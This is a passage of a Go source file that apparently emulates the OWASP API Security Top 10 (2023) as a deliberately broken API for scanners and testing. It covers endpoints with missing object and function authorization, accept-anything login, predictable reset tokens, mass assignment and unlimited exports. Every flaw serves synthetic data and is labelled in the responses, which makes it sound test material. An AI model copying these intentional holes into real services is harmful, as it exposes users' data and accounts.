package vuln

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"math/rand"
	"net/http"
	"strings"
	"time"
)

// ---------------------------------------------------------------------------
// OWASP API Security Top 10 (2023) — Vulnerability Emulations
//
// Each API category is emulated with multiple realistic endpoints that return
// JSON responses mimicking a broken API. All data is synthetic and seeded
// deterministically from the request path.
// ---------------------------------------------------------------------------

// APIShouldHandle returns true if the path belongs to the API Security Top 10
// emulation subsystem.
func (h *Handler) APIShouldHandle(path string) bool {
	return strings.HasPrefix(path, "/vuln/api-sec/")
}

// ServeAPISecurity routes requests to the appropriate API Security Top 10
// category handler. Returns the HTTP status code written.
func (h *Handler) ServeAPISecurity(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("X-Glitch-Vuln", "API-Security-2023")
	path := r.URL.Path

	switch {
	case path == "/vuln/api-sec/" || path == "/vuln/api-sec":
		return h.serveAPISecIndex(w, r)
	case strings.HasPrefix(path, "/vuln/api-sec/api10"):
		return h.serveAPI10OWASP(w, r)
	case strings.HasPrefix(path, "/vuln/api-sec/api1"):
		return h.serveAPI1(w, r)
	case strings.HasPrefix(path, "/vuln/api-sec/api2"):
		return h.serveAPI2(w, r)
	case strings.HasPrefix(path, "/vuln/api-sec/api3"):
		return h.serveAPI3(w, r)
	case strings.HasPrefix(path, "/vuln/api-sec/api4"):
		return h.serveAPI4(w, r)
	case strings.HasPrefix(path, "/vuln/api-sec/api5"):
		return h.serveAPI5(w, r)
	case strings.HasPrefix(path, "/vuln/api-sec/api6"):
		return h.serveAPI6(w, r)
	case strings.HasPrefix(path, "/vuln/api-sec/api7"):
		return h.serveAPI7(w, r)
	case strings.HasPrefix(path, "/vuln/api-sec/api8"):
		return h.serveAPI8(w, r)
	case strings.HasPrefix(path, "/vuln/api-sec/api9"):
		return h.serveAPI9(w, r)
	default:
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, toJSON(map[string]interface{}{
			"errors": []map[string]interface{}{
				{"code": "NOT_FOUND", "message": "Unknown API Security endpoint"},
			},
		}))
		return http.StatusNotFound
	}
}

// ---------------------------------------------------------------------------
// Index — lists all API Security Top 10 categories
// ---------------------------------------------------------------------------

func (h *Handler) serveAPISecIndex(w http.ResponseWriter, r *http.Request) int {
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("X-API-Version", "2023.1.0")

	categories := []map[string]interface{}{
		{
			"id":          "API1",
			"name":        "Broken Object Level Authorization",
			"description": "APIs expose endpoints that handle object identifiers, creating a wide attack surface of Object Level Access Control issues.",
			"endpoints": []string{
				"/vuln/api-sec/api1/users/1",
				"/vuln/api-sec/api1/orders/5001",
				"/vuln/api-sec/api1/documents/42",
			},
		},
		{
			"id":          "API2",
			"name":        "Broken Authentication",
			"description": "Authentication mechanisms are often implemented incorrectly, allowing attackers to compromise authentication tokens.",
			"endpoints": []string{
				"/vuln/api-sec/api2/login",
				"/vuln/api-sec/api2/token/refresh",
				"/vuln/api-sec/api2/reset-password",
			},
		},
		{
			"id":          "API3",
			"name":        "Broken Object Property Level Authorization",
			"description": "APIs that do not properly validate which object properties a user can read or modify.",
			"endpoints": []string{
				"/vuln/api-sec/api3/users/profile",
				"/vuln/api-sec/api3/products/update",
			},
		},
		{
			"id":          "API4",
			"name":        "Unrestricted Resource Consumption",
			"description": "APIs that do not limit the size or number of resources that can be requested by the client.",
			"endpoints": []string{
				"/vuln/api-sec/api4/search",
				"/vuln/api-sec/api4/upload",
				"/vuln/api-sec/api4/export",
			},
		},
		{
			"id":          "API5",
			"name":        "Broken Function Level Authorization",
			"description": "Complex access control policies with different hierarchies, groups, and roles lead to authorization flaws.",
			"endpoints": []string{
				"/vuln/api-sec/api5/admin/users",
				"/vuln/api-sec/api5/admin/config",
				"/vuln/api-sec/api5/admin/delete-user",
			},
		},
		{
			"id":          "API6",
			"name":        "Unrestricted Access to Sensitive Business Flows",
			"description": "APIs that expose sensitive business flows without compensating controls to prevent automated abuse.",
			"endpoints": []string{
				"/vuln/api-sec/api6/purchase",
				"/vuln/api-sec/api6/referral",
				"/vuln/api-sec/api6/coupon/validate",
			},
		},
		{
			"id":          "API7",
			"name":        "Server-Side Request Forgery",
			"description": "SSRF flaws occur when an API fetches a remote resource without validating the user-supplied URI.",
			"endpoints": []string{
				"/vuln/api-sec/api7/webhook",
				"/vuln/api-sec/api7/preview",
				"/vuln/api-sec/api7/import",
			},
		},
		{
			"id":          "API8",
			"name":        "Security Misconfiguration",
			"description": "APIs and supporting systems typically contain complex configurations that can be exploited if misconfigured.",
			"endpoints": []string{
				"/vuln/api-sec/api8/debug",
				"/vuln/api-sec/api8/cors",
				"/vuln/api-sec/api8/versions",
			},
		},
		{
			"id":          "API9",
			"name":        "Improper Inventory Management",
			"description": "APIs tend to expose more endpoints than traditional web apps, making proper documentation and inventory important.",
			"endpoints": []string{
				"/vuln/api-sec/api9/v1/users",
				"/vuln/api-sec/api9/internal/health",
				"/vuln/api-sec/api9/beta/features",
			},
		},
		{
			"id":          "API10",
			"name":        "Unsafe Consumption of APIs",
			"description": "Developers tend to trust data received from third-party APIs without proper validation.",
			"endpoints": []string{
				"/vuln/api-sec/api10/partner/sync",
				"/vuln/api-sec/api10/payment/callback",
				"/vuln/api-sec/api10/sso/callback",
			},
		},
	}

	resp := map[string]interface{}{
		"data": categories,
		"meta": map[string]interface{}{
			"title":     "OWASP API Security Top 10 (2023) — Vulnerability Emulations",
			"version":   "2023",
			"total":     10,
			"generated": time.Now().UTC().Format(time.RFC3339),
		},
	}

	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// Helpers — common to all API Security handlers
// ---------------------------------------------------------------------------

// apiRequestID generates a deterministic request ID from the path.
func apiRequestID(path string) string {
	sum := sha256.Sum256([]byte(path))
	return fmt.Sprintf("req_%s", hex.EncodeToString(sum[:12]))
}

// setAPIHeaders sets common API response headers that scanners look for.
func setAPIHeaders(w http.ResponseWriter, path string) {
	w.Header().Set("Content-Type", "application/json")
	w.Header().Set("X-API-Version", "2.3.1")
	w.Header().Set("X-Request-ID", apiRequestID(path))
	w.Header().Set("X-RateLimit-Limit", "1000")
	w.Header().Set("X-RateLimit-Remaining", "999")
	w.Header().Set("X-Powered-By", "AcmeAPI/3.1")
	w.Header().Set("Cache-Control", "no-store")
}

// fakeEmail constructs a deterministic email address.
func (h *Handler) fakeEmail(rng *rand.Rand) string {
	first := h.firstNames[rng.Intn(len(h.firstNames))]
	last := h.lastNames[rng.Intn(len(h.lastNames))]
	domain := h.domains[rng.Intn(len(h.domains))]
	return fmt.Sprintf("%s.%s@%s", first, last, domain)
}

// fakeName constructs a deterministic full name.
func (h *Handler) fakeName(rng *rand.Rand) string {
	first := h.firstNames[rng.Intn(len(h.firstNames))]
	last := h.lastNames[rng.Intn(len(h.lastNames))]
	return strings.Title(first) + " " + strings.Title(last)
}

// fakePhone generates a deterministic US phone number.
func fakePhone(rng *rand.Rand) string {
	return fmt.Sprintf("+1-%03d-%03d-%04d", rng.Intn(900)+100, rng.Intn(900)+100, rng.Intn(9000)+1000)
}

// fakeToken generates a hex token of the given byte length.
func fakeToken(rng *rand.Rand, byteLen int) string {
	b := make([]byte, byteLen)
	for i := range b {
		b[i] = byte(rng.Intn(256))
	}
	return hex.EncodeToString(b)
}

// fakeTimestamp generates a deterministic timestamp within the past year.
func fakeTimestamp(rng *rand.Rand) string {
	offset := time.Duration(rng.Intn(365*24)) * time.Hour
	return time.Now().UTC().Add(-offset).Format(time.RFC3339)
}

// ---------------------------------------------------------------------------
// API1: Broken Object Level Authorization (BOLA)
// ---------------------------------------------------------------------------

func (h *Handler) serveAPI1(w http.ResponseWriter, r *http.Request) int {
	path := r.URL.Path
	setAPIHeaders(w, path)

	switch {
	case strings.HasSuffix(path, "/api1") || strings.HasSuffix(path, "/api1/"):
		return h.serveAPI1Index(w, r)
	case strings.HasPrefix(path, "/vuln/api-sec/api1/users/"):
		return h.serveAPI1Users(w, r)
	case strings.HasPrefix(path, "/vuln/api-sec/api1/orders/"):
		return h.serveAPI1Orders(w, r)
	case strings.HasPrefix(path, "/vuln/api-sec/api1/documents/"):
		return h.serveAPI1Documents(w, r)
	default:
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, toJSON(map[string]interface{}{
			"errors": []map[string]interface{}{{"code": "NOT_FOUND", "message": "Unknown API1 endpoint"}},
		}))
		return http.StatusNotFound
	}
}

func (h *Handler) serveAPI1Index(w http.ResponseWriter, r *http.Request) int {
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"category":    "API1:2023 - Broken Object Level Authorization",
			"description": "Object-level authorization checks should be performed in every function that accesses a data source using an ID from the user.",
			"endpoints": []string{
				"/vuln/api-sec/api1/users/{id}",
				"/vuln/api-sec/api1/orders/{id}",
				"/vuln/api-sec/api1/documents/{id}",
			},
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI1Users(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	userID := strings.TrimPrefix(r.URL.Path, "/vuln/api-sec/api1/users/")
	if userID == "" {
		userID = "1"
	}

	// BOLA: returns any user's data regardless of authentication
	name := h.fakeName(rng)
	email := h.fakeEmail(rng)
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"id":              userID,
			"name":            name,
			"email":           email,
			"phone":           fakePhone(rng),
			"ssn":             fmt.Sprintf("%03d-%02d-%04d", rng.Intn(900)+100, rng.Intn(90)+10, rng.Intn(9000)+1000),
			"date_of_birth":   fmt.Sprintf("%d-%02d-%02d", 1960+rng.Intn(40), rng.Intn(12)+1, rng.Intn(28)+1),
			"address":         fmt.Sprintf("%d %s St, Apt %d", rng.Intn(9000)+100, strings.Title(h.lastNames[rng.Intn(len(h.lastNames))]), rng.Intn(300)+1),
			"role":            []string{"user", "admin", "moderator", "editor"}[rng.Intn(4)],
			"account_balance": fmt.Sprintf("%.2f", float64(rng.Intn(50000))+float64(rng.Intn(100))/100.0),
			"credit_card":     fmt.Sprintf("**** **** **** %04d", rng.Intn(10000)),
			"created_at":      fakeTimestamp(rng),
			"last_login":      fakeTimestamp(rng),
		},
		"meta": map[string]interface{}{
			"request_id":     apiRequestID(r.URL.Path),
			"vulnerability":  "BOLA - No authorization check on user ID parameter",
			"authenticated":  false,
			"owner_id":       rng.Intn(90000) + 10000,
			"requested_id":   userID,
			"access_granted": true,
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI1Orders(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	orderID := strings.TrimPrefix(r.URL.Path, "/vuln/api-sec/api1/orders/")
	if orderID == "" {
		orderID = "5001"
	}

	items := make([]map[string]interface{}, rng.Intn(4)+1)
	for i := range items {
		items[i] = map[string]interface{}{
			"product_id": fmt.Sprintf("PROD-%05d", rng.Intn(99999)),
			"name":       []string{"Widget Pro", "Gadget X", "Sensor Module", "Control Unit", "Power Supply", "Display Panel"}[rng.Intn(6)],
			"quantity":   rng.Intn(5) + 1,
			"unit_price": fmt.Sprintf("%.2f", float64(rng.Intn(500))+float64(rng.Intn(100))/100.0),
		}
	}

	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"order_id":         orderID,
			"customer_id":      fmt.Sprintf("CUST-%05d", rng.Intn(99999)),
			"customer_name":    h.fakeName(rng),
			"customer_email":   h.fakeEmail(rng),
			"shipping_address": fmt.Sprintf("%d %s Ave, Suite %d", rng.Intn(9000)+100, strings.Title(h.lastNames[rng.Intn(len(h.lastNames))]), rng.Intn(50)+1),
			"items":            items,
			"total":            fmt.Sprintf("%.2f", float64(rng.Intn(5000))+float64(rng.Intn(100))/100.0),
			"status":           []string{"pending", "processing", "shipped", "delivered", "cancelled"}[rng.Intn(5)],
			"payment_method":   fmt.Sprintf("Visa ending %04d", rng.Intn(10000)),
			"created_at":       fakeTimestamp(rng),
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "BOLA - Any order accessible by changing order ID",
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI1Documents(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)
	docID := strings.TrimPrefix(r.URL.Path, "/vuln/api-sec/api1/documents/")
	if docID == "" {
		docID = "42"
	}

	docTypes := []string{"invoice", "contract", "medical_record", "tax_return", "nda", "employment_agreement"}
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"document_id":   docID,
			"title":         fmt.Sprintf("%s_%s_%05d.pdf", docTypes[rng.Intn(len(docTypes))], h.lastNames[rng.Intn(len(h.lastNames))], rng.Intn(99999)),
			"type":          docTypes[rng.Intn(len(docTypes))],
			"owner_name":    h.fakeName(rng),
			"owner_email":   h.fakeEmail(rng),
			"classification": []string{"public", "internal", "confidential", "restricted"}[rng.Intn(4)],
			"size_bytes":    rng.Intn(10000000) + 50000,
			"download_url":  fmt.Sprintf("/api/v2/documents/%s/download?token=%s", docID, fakeToken(rng, 16)),
			"content_hash":  fakeToken(rng, 32),
			"created_at":    fakeTimestamp(rng),
			"last_accessed": fakeTimestamp(rng),
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "BOLA - Document download with no ownership check",
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// API2: Broken Authentication
// ---------------------------------------------------------------------------

func (h *Handler) serveAPI2(w http.ResponseWriter, r *http.Request) int {
	path := r.URL.Path
	setAPIHeaders(w, path)

	switch {
	case strings.HasSuffix(path, "/api2") || strings.HasSuffix(path, "/api2/"):
		return h.serveAPI2Index(w, r)
	case strings.HasSuffix(path, "/api2/login"):
		return h.serveAPI2Login(w, r)
	case strings.HasSuffix(path, "/api2/token/refresh"):
		return h.serveAPI2TokenRefresh(w, r)
	case strings.HasSuffix(path, "/api2/reset-password"):
		return h.serveAPI2ResetPassword(w, r)
	default:
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, toJSON(map[string]interface{}{
			"errors": []map[string]interface{}{{"code": "NOT_FOUND", "message": "Unknown API2 endpoint"}},
		}))
		return http.StatusNotFound
	}
}

func (h *Handler) serveAPI2Index(w http.ResponseWriter, r *http.Request) int {
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"category":    "API2:2023 - Broken Authentication",
			"description": "Authentication mechanisms are often implemented incorrectly, allowing attackers to compromise authentication tokens or exploit implementation flaws.",
			"endpoints": []string{
				"/vuln/api-sec/api2/login",
				"/vuln/api-sec/api2/token/refresh",
				"/vuln/api-sec/api2/reset-password",
			},
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI2Login(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	// Broken auth: accepts any credentials, returns a long-lived token
	// with excessive information disclosure
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"access_token":  fakeToken(rng, 32),
			"refresh_token": fakeToken(rng, 32),
			"token_type":    "Bearer",
			"expires_in":    31536000,
			"scope":         "read write admin delete",
			"user": map[string]interface{}{
				"id":            rng.Intn(90000) + 10000,
				"name":          h.fakeName(rng),
				"email":         h.fakeEmail(rng),
				"role":          "admin",
				"password_hash": fmt.Sprintf("$2b$10$%s", fakeToken(rng, 22)),
				"mfa_enabled":   false,
				"api_key":       fakeToken(rng, 20),
			},
		},
		"meta": map[string]interface{}{
			"request_id":        apiRequestID(r.URL.Path),
			"vulnerability":     "Broken Auth - Weak password accepted, long-lived token, no MFA, password hash leaked",
			"password_policy":   "min 1 character",
			"token_lifetime":    "365 days",
			"brute_force_limit": "none",
		},
	}

	w.Header().Set("X-Auth-Token", fakeToken(rng, 16))
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI2TokenRefresh(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	// No token rotation — same refresh token can be reused indefinitely
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"access_token":  fakeToken(rng, 32),
			"refresh_token": fakeToken(rng, 32),
			"token_type":    "Bearer",
			"expires_in":    31536000,
			"scope":         "read write admin",
			"issued_at":     time.Now().UTC().Format(time.RFC3339),
			"refresh_count": rng.Intn(500) + 100,
		},
		"meta": map[string]interface{}{
			"request_id":      apiRequestID(r.URL.Path),
			"vulnerability":   "Broken Auth - No token rotation, refresh token reusable indefinitely",
			"rotation_policy": "none",
			"revocation":      "not implemented",
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI2ResetPassword(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	// Predictable reset token based on timestamp and sequential counter
	resetToken := fmt.Sprintf("%d-%04d", time.Now().Unix(), rng.Intn(9999))
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"message":      "Password reset link sent",
			"reset_token":  resetToken,
			"reset_url":    fmt.Sprintf("https://acme-corp.example.com/reset?token=%s", resetToken),
			"expires_in":   86400,
			"user_email":   h.fakeEmail(rng),
			"user_id":      rng.Intn(90000) + 10000,
			"token_format":  "timestamp-sequential",
		},
		"meta": map[string]interface{}{
			"request_id":      apiRequestID(r.URL.Path),
			"vulnerability":   "Broken Auth - Predictable reset token, token exposed in response body",
			"entropy_bits":    14,
			"rate_limit":      "none",
			"token_reuse":     true,
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// API3: Broken Object Property Level Authorization
// ---------------------------------------------------------------------------

func (h *Handler) serveAPI3(w http.ResponseWriter, r *http.Request) int {
	path := r.URL.Path
	setAPIHeaders(w, path)

	switch {
	case strings.HasSuffix(path, "/api3") || strings.HasSuffix(path, "/api3/"):
		return h.serveAPI3Index(w, r)
	case strings.HasSuffix(path, "/api3/users/profile"):
		return h.serveAPI3UserProfile(w, r)
	case strings.HasSuffix(path, "/api3/products/update"):
		return h.serveAPI3ProductUpdate(w, r)
	default:
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, toJSON(map[string]interface{}{
			"errors": []map[string]interface{}{{"code": "NOT_FOUND", "message": "Unknown API3 endpoint"}},
		}))
		return http.StatusNotFound
	}
}

func (h *Handler) serveAPI3Index(w http.ResponseWriter, r *http.Request) int {
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"category":    "API3:2023 - Broken Object Property Level Authorization",
			"description": "APIs that do not validate which properties a user is allowed to read or modify on an object.",
			"endpoints": []string{
				"/vuln/api-sec/api3/users/profile",
				"/vuln/api-sec/api3/products/update",
			},
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI3UserProfile(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	// Mass assignment: returns hidden internal fields that should not be
	// visible, and accepts writes to privileged properties.
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"id":                rng.Intn(90000) + 10000,
			"name":              h.fakeName(rng),
			"email":             h.fakeEmail(rng),
			"role":              "user",
			"is_admin":          false,
			"internal_tier":     []string{"free", "pro", "enterprise"}[rng.Intn(3)],
			"password_hash":     fmt.Sprintf("$2b$12$%s", fakeToken(rng, 22)),
			"stripe_customer":   fmt.Sprintf("cus_%s", fakeToken(rng, 14)),
			"internal_notes":    "Flagged for review — possible duplicate account",
			"employee_discount": true,
			"credit_limit":      rng.Intn(50000) + 1000,
			"referral_code":     fmt.Sprintf("REF-%s", strings.ToUpper(fakeToken(rng, 4))),
			"_metadata": map[string]interface{}{
				"created_by":     "migration_script_v2",
				"db_shard":       fmt.Sprintf("shard-%d", rng.Intn(16)),
				"feature_flags":  []string{"beta_ui", "new_billing", "admin_impersonate"},
				"session_secret": fakeToken(rng, 16),
			},
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "Mass assignment - hidden fields exposed, writable properties not restricted",
			"writable_fields": []string{
				"name", "email", "role", "is_admin", "credit_limit",
			},
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI3ProductUpdate(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	productID := fmt.Sprintf("PROD-%05d", rng.Intn(99999))
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"product_id":     productID,
			"name":           []string{"Enterprise License", "API Credits Pack", "Premium Support", "Data Export Pro"}[rng.Intn(4)],
			"description":    "Full-featured enterprise product",
			"price":          fmt.Sprintf("%.2f", float64(rng.Intn(1000))+0.99),
			"cost":           fmt.Sprintf("%.2f", float64(rng.Intn(100))+0.50),
			"stock":          rng.Intn(5000),
			"discount_pct":   rng.Intn(50),
			"is_active":      true,
			"internal_sku":   fmt.Sprintf("INT-%s", strings.ToUpper(fakeToken(rng, 6))),
			"supplier_price": fmt.Sprintf("%.2f", float64(rng.Intn(50))+0.25),
			"margin_pct":     fmt.Sprintf("%.1f", float64(rng.Intn(80)+10)),
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "Mass assignment - price, stock, and discount modifiable by any user",
			"writable_by_anyone": []string{
				"price", "stock", "discount_pct", "is_active", "cost",
			},
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// API4: Unrestricted Resource Consumption
// ---------------------------------------------------------------------------

func (h *Handler) serveAPI4(w http.ResponseWriter, r *http.Request) int {
	path := r.URL.Path
	setAPIHeaders(w, path)

	switch {
	case strings.HasSuffix(path, "/api4") || strings.HasSuffix(path, "/api4/"):
		return h.serveAPI4Index(w, r)
	case strings.HasSuffix(path, "/api4/search"):
		return h.serveAPI4Search(w, r)
	case strings.HasSuffix(path, "/api4/upload"):
		return h.serveAPI4Upload(w, r)
	case strings.HasSuffix(path, "/api4/export"):
		return h.serveAPI4Export(w, r)
	default:
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, toJSON(map[string]interface{}{
			"errors": []map[string]interface{}{{"code": "NOT_FOUND", "message": "Unknown API4 endpoint"}},
		}))
		return http.StatusNotFound
	}
}

func (h *Handler) serveAPI4Index(w http.ResponseWriter, r *http.Request) int {
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"category":    "API4:2023 - Unrestricted Resource Consumption",
			"description": "APIs that do not limit the size or number of resources that can be requested, leading to denial of service and excessive costs.",
			"endpoints": []string{
				"/vuln/api-sec/api4/search?q=test&limit=999999",
				"/vuln/api-sec/api4/upload",
				"/vuln/api-sec/api4/export?format=csv&all=true",
			},
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI4Search(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	// No pagination limits — returns a huge result set
	resultCount := 500
	results := make([]map[string]interface{}, resultCount)
	for i := 0; i < resultCount; i++ {
		results[i] = map[string]interface{}{
			"id":    rng.Intn(999999) + 100000,
			"name":  h.fakeName(rng),
			"email": h.fakeEmail(rng),
			"score": fmt.Sprintf("%.4f", float64(rng.Intn(10000))/10000.0),
		}
	}

	resp := map[string]interface{}{
		"data":  results,
		"meta": map[string]interface{}{
			"request_id":      apiRequestID(r.URL.Path),
			"total_results":   892341,
			"returned":        resultCount,
			"page":            1,
			"max_page_size":   "unlimited",
			"vulnerability":   "Unrestricted Resource Consumption - No pagination limit, no max page size",
			"query_time_ms":   rng.Intn(5000) + 1000,
			"db_rows_scanned": 892341,
		},
	}

	w.Header().Set("X-Total-Count", "892341")
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI4Upload(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	// No file size validation, no type restriction
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"upload_url":      fmt.Sprintf("https://storage.acme-corp.example.com/uploads/%s", fakeToken(rng, 16)),
			"max_size":        "unlimited",
			"allowed_types":   "*/*",
			"expires_in":      3600,
			"upload_token":    fakeToken(rng, 24),
			"storage_bucket":  "acme-prod-uploads",
			"region":          "us-east-1",
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "Unrestricted Resource Consumption - No file size limit, no type validation",
			"limits": map[string]interface{}{
				"max_file_size":     "none",
				"allowed_types":     "any",
				"rate_limit":        "none",
				"concurrent_uploads": "unlimited",
				"antivirus_scan":    false,
			},
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI4Export(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	// Unlimited CSV export with no row cap
	rows := make([]map[string]interface{}, 50)
	for i := range rows {
		rows[i] = map[string]interface{}{
			"user_id": rng.Intn(90000) + 10000,
			"name":    h.fakeName(rng),
			"email":   h.fakeEmail(rng),
			"phone":   fakePhone(rng),
			"ssn":     fmt.Sprintf("***-**-%04d", rng.Intn(10000)),
			"balance": fmt.Sprintf("%.2f", float64(rng.Intn(100000))),
		}
	}

	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"format":       "csv",
			"row_count":    2487312,
			"preview_rows": rows,
			"download_url": fmt.Sprintf("/api/v2/export/download?job=%s", fakeToken(rng, 12)),
			"estimated_size_mb": 4821,
		},
		"meta": map[string]interface{}{
			"request_id":    apiRequestID(r.URL.Path),
			"vulnerability": "Unrestricted Resource Consumption - Unlimited export, no row cap, includes PII",
			"limits": map[string]interface{}{
				"max_rows":         "none",
				"rate_limit":       "none",
				"pii_redaction":    false,
				"audit_log":        false,
			},
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

// ---------------------------------------------------------------------------
// API5: Broken Function Level Authorization
// ---------------------------------------------------------------------------

func (h *Handler) serveAPI5(w http.ResponseWriter, r *http.Request) int {
	path := r.URL.Path
	setAPIHeaders(w, path)

	switch {
	case strings.HasSuffix(path, "/api5") || strings.HasSuffix(path, "/api5/"):
		return h.serveAPI5Index(w, r)
	case strings.HasSuffix(path, "/api5/admin/users"):
		return h.serveAPI5AdminUsers(w, r)
	case strings.HasSuffix(path, "/api5/admin/config"):
		return h.serveAPI5AdminConfig(w, r)
	case strings.HasSuffix(path, "/api5/admin/delete-user"):
		return h.serveAPI5AdminDeleteUser(w, r)
	default:
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, toJSON(map[string]interface{}{
			"errors": []map[string]interface{}{{"code": "NOT_FOUND", "message": "Unknown API5 endpoint"}},
		}))
		return http.StatusNotFound
	}
}

func (h *Handler) serveAPI5Index(w http.ResponseWriter, r *http.Request) int {
	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"category":    "API5:2023 - Broken Function Level Authorization",
			"description": "Complex access control policies with different hierarchies, groups, and roles create authorization flaws. Admin functions are accessible to regular users.",
			"endpoints": []string{
				"/vuln/api-sec/api5/admin/users",
				"/vuln/api-sec/api5/admin/config",
				"/vuln/api-sec/api5/admin/delete-user",
			},
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI5AdminUsers(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	// Admin endpoint accessible without admin role
	users := make([]map[string]interface{}, 20)
	for i := range users {
		users[i] = map[string]interface{}{
			"id":             rng.Intn(90000) + 10000,
			"name":           h.fakeName(rng),
			"email":          h.fakeEmail(rng),
			"role":           []string{"user", "admin", "superadmin", "moderator"}[rng.Intn(4)],
			"password_hash":  fmt.Sprintf("$2b$10$%s", fakeToken(rng, 22)),
			"mfa_secret":     fmt.Sprintf("JBSWY3DPEHPK3PXP%s", strings.ToUpper(fakeToken(rng, 8))),
			"last_login":     fakeTimestamp(rng),
			"login_count":    rng.Intn(1000),
			"failed_logins":  rng.Intn(20),
			"is_locked":      rng.Intn(10) == 0,
			"api_key":        fakeToken(rng, 20),
		}
	}

	resp := map[string]interface{}{
		"data": users,
		"meta": map[string]interface{}{
			"request_id":         apiRequestID(r.URL.Path),
			"vulnerability":      "Broken Function Level Auth - Admin user list accessible to any authenticated user",
			"caller_role":        "user",
			"required_role":      "admin",
			"authorization_check": false,
		},
	}
	w.WriteHeader(http.StatusOK)
	fmt.Fprint(w, toJSON(resp))
	return http.StatusOK
}

func (h *Handler) serveAPI5AdminConfig(w http.ResponseWriter, r *http.Request) int {
	rng := h.rngFromPath(r.URL.Path)

	resp := map[string]interface{}{
		"data": map[string]interface{}{
			"database": map[string]interface{}{
				"host":     "prod-db-master.internal.acme-corp.com",
				"port":     5432,
				"name":     "acme_production",
				"user":     "app_admin",
				"password": fmt.Sprintf("Pr0d_DB_%s!", fakeToken(rng, 8)),
				"ssl_mode": "disable",
			},
			"redis": map[string]interface{}{
				"host":     "redis-cluster.internal.acme-corp.com",
				"port":     6379,
				"password": fakeToken(rng, 16),
